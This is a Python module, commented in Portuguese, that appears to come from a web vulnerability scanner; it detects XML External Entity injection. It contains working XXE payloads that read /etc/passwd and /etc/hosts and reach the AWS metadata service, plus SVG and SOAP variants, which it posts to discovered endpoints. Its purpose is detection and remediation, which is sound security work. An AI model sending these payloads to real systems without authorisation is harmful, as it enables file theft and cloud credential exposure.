"""
XXE Checker — XML External Entity Injection
Detecta endpoints que processam XML sem desabilitar entidades externas,
permitindo leitura de arquivos locais e SSRF via XML.
"""

import requests
import urllib3
import re
from urllib.parse import urlparse
from modules.rate_limiter import get_limiter

urllib3.disable_warnings()
HEADERS = {"User-Agent": "Mozilla/5.0 VulnScanner/4.0"}

# Payloads XXE
XXE_PAYLOADS = [
    # Leitura de /etc/passwd
    {
        "label": "File read (/etc/passwd)",
        "content_type": "application/xml",
        "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
        "indicators": ["root:x:", "/bin/bash", "/bin/sh", "daemon:", "nobody:"],
    },
    # Leitura de /etc/hosts
    {
        "label": "File read (/etc/hosts)",
        "content_type": "application/xml",
        "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>""",
        "indicators": ["localhost", "127.0.0.1", "::1"],
    },
    # SSRF via XXE para metadados AWS
    {
        "label": "SSRF via XXE (AWS metadata)",
        "content_type": "application/xml",
        "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",
        "indicators": ["ami-id", "instance-id", "local-hostname", "public-ipv4"],
    },
    # XXE com parâmetro de entidade (blind)
    {
        "label": "XXE Blind (parameter entity)",
        "content_type": "application/xml",
        "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "file:///etc/passwd">
  %remote;
]>
<root/>""",
        "indicators": ["root:x:", "daemon:", "ENTITY", "DOCTYPE"],
    },
    # XXE via SVG
    {
        "label": "XXE via SVG upload",
        "content_type": "image/svg+xml",
        "body": """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text>&xxe;</text>
</svg>""",
        "indicators": ["root:x:", "/bin/bash", "daemon:"],
    },
    # XXE via SOAP
    {
        "label": "XXE via SOAP",
        "content_type": "text/xml",
        "body": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><data>&xxe;</data></soapenv:Body>
</soapenv:Envelope>""",
        "indicators": ["root:x:", "/bin/bash", "daemon:"],
    },
]

# Endpoints que tipicamente processam XML
XML_PATHS = [
    "/api/", "/soap/", "/ws/", "/webservice/", "/xml/",
    "/upload/", "/import/", "/parse/", "/rss/", "/feed/",
    "/graphql/", "/api/v1/", "/api/v2/",
]

# Palavras que indicam endpoint que aceita XML
XML_INDICATORS_IN_PAGE = [
    "xml", "soap", "wsdl", "xsd", "rss", "atom", "svg",
    "application/xml", "text/xml", "content-type.*xml",
]


def _build_headers(auth=None, content_type="application/xml"):
    h = dict(HEADERS)
    h["Content-Type"] = content_type
    h["Accept"] = "application/xml, text/xml, */*"
    if auth:
        if auth.get("auth_headers"):
            h.update(auth["auth_headers"])
        if auth.get("cookies"):
            h["Cookie"] = auth["cookies"]
    return h


def _test_endpoint(url: str, auth=None, limiter=None) -> list[dict]:
    """Testa todos os payloads XXE num endpoint."""
    results = []

    for payload in XXE_PAYLOADS:
        try:
            if limiter:
                limiter.wait()
            h = _build_headers(auth, payload["content_type"])
            resp = requests.post(
                url, data=payload["body"].encode("utf-8"),
                timeout=10, verify=False, headers=h,
            )

            for indicator in payload["indicators"]:
                if indicator.lower() in resp.text.lower():
                    results.append({
                        "severity": "critical",
                        "title": f"XXE detectado: {payload['label']}",
                        "detail": (
                            f"Endpoint '{url}' processou entidade XML externa. "
                            f"Indicador encontrado: '{indicator}'. "
                            f"Content-Type usado: {payload['content_type']}. "
                            f"Isso permite leitura de arquivos locais e possível SSRF."
                        ),
                        "fix": (
                            "Desabilite o processamento de entidades externas no parser XML. "
                            "Em Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                            "Em Python (lxml): use defusedxml. "
                            "Em PHP: libxml_disable_entity_loader(true). "
                            "Use parsers JSON quando possível em vez de XML."
                        ),
                        "cvss": "9.8",
                    })
                    return results  # Um finding por endpoint é suficiente

            # Verifica erro de parse que indica que XML foi processado mas entidade bloqueada
            if resp.status_code == 500:
                body_lower = resp.text.lower()
                if any(e in body_lower for e in ["xml", "entity", "parse", "dtd", "doctype"]):
                    results.append({
                        "severity": "medium",
                        "title": f"Endpoint processa XML mas bloqueia entidades externas — {url[:80]}",
                        "detail": (
                            f"O servidor retornou HTTP 500 com erro relacionado a XML. "
                            f"O parser XML está ativo mas pode ter proteção parcial. "
                            f"Payload: {payload['label']}"
                        ),
                        "fix": (
                            "Verifique as configurações do parser XML. "
                            "Garanta que FEATURE_SECURE_PROCESSING está habilitado "
                            "e que DTDs externos estão completamente desabilitados."
                        ),
                        "cvss": "5.3",
                    })

        except Exception:
            continue

    return results


def _find_xml_endpoints(base_url: str, crawl_data: dict, auth=None, limiter=None) -> list[str]:
    """Descobre endpoints que podem aceitar XML."""
    endpoints = set()
    h = dict(HEADERS)
    if auth:
        if auth.get("auth_headers"):
            h.update(auth["auth_headers"])
        if auth.get("cookies"):
            h["Cookie"] = auth["cookies"]

    # Paths fixos de XML
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in XML_PATHS:
        try:
            if limiter:
                limiter.wait()
            resp = requests.get(base + path, timeout=5, verify=False, headers=h)
            if resp.status_code in (200, 405):  # 405 = método não permitido, mas existe
                endpoints.add(base + path)
        except Exception:
            continue

    # Endpoints do crawler
    if crawl_data:
        for url in crawl_data.get("urls", []):
            parsed_u = urlparse(url)
            # Endpoints de API ou que contêm xml no path
            if any(p in parsed_u.path.lower() for p in ["/api", "/xml", "/soap", "/ws"]):
                endpoints.add(url.split("?")[0])

        # Verifica Content-Type dos forms para encontrar uploads XML/SVG
        for form in crawl_data.get("forms", []):
            for inp in form.get("inputs", []):
                inp_type = inp.get("type", "").lower()
                inp_accept = inp.get("accept", "").lower()
                if inp_type == "file" and any(x in inp_accept for x in ["xml", "svg", "text"]):
                    endpoints.add(form["action"])

    return list(endpoints)[:10]  # Limita para performance


def check_xxe(url: str, crawl_data: dict = None, auth=None,
              rate_profile: str = "normal") -> dict:
    """Detecta vulnerabilidades XXE na aplicação."""
    findings = []
    if not url.startswith("http"):
        url = "https://" + url

    limiter = get_limiter(rate_profile)

    # Descobre endpoints XML
    endpoints = _find_xml_endpoints(url, crawl_data or {}, auth=auth, limiter=limiter)

    # Adiciona a URL base
    endpoints.insert(0, url)

    tested = 0
    found = 0

    for endpoint in endpoints:
        results = _test_endpoint(endpoint, auth=auth, limiter=limiter)
        if results:
            findings.extend(results)
            found += len(results)
        tested += 1

    findings.append({
        "severity": "info",
        "title": f"XXE: {tested} endpoint(s) testados",
        "detail": (
            f"Endpoints testados: {', '.join(e[:60] for e in endpoints[:5])}. "
            f"Payloads: file:///etc/passwd, AWS metadata, SOAP, SVG."
        ),
        "fix": "",
    })

    if found == 0:
        findings.append({
            "severity": "info",
            "title": "Nenhum XXE detectado",
            "detail": (
                "Nenhum endpoint retornou conteúdo de entidades XML externas. "
                "O servidor pode não processar XML ou ter proteção configurada."
            ),
            "fix": "",
        })

    return {"module": "XXE", "icon": "ti-file-code", "findings": findings}
